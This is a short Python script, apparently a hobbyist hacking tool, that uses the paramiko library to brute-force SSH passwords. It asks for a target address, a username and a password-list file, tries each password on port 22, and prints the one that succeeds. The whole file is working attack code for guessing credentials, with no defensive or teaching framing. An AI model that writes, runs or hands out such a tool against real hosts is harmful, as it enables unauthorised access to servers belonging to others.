import paramiko, sys, os, socket, termcolor

host = input('[+] Target Address : ')
username =  input('[+] SSH Username : ')
keyfile = input('[+] Password File : ')

if os.path.exists(keyfile) == False :
    print('!! That File/Path Doesnt Exist !!')
    sys.exit(1)

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try :
        ssh.connect(hostname=host,port=22,username=username,password=password)
    except paramiko.AuthenticationException : #if the password is incorrect
        code = 1
    except socket.error as e :   #if host is down
        code = 2

    ssh.close()
    return code


with open(keyfile, 'r+') as file :
    for line in file.readlines() :
        password = line.strip()
        try :
            response = ssh_connect(password)
            if response == 0 :
                print(termcolor.colored((f"[+] Password is Found ! : {password}"),'green'))
                break
            elif response == 1 :
                print(f"[-] Password is Incorrect ! : {password}")
            elif response == 2 :
                print(f"[-] We can not access device !")
                sys.exit(1)

        except Exception as e :
            print(e)
            pass




















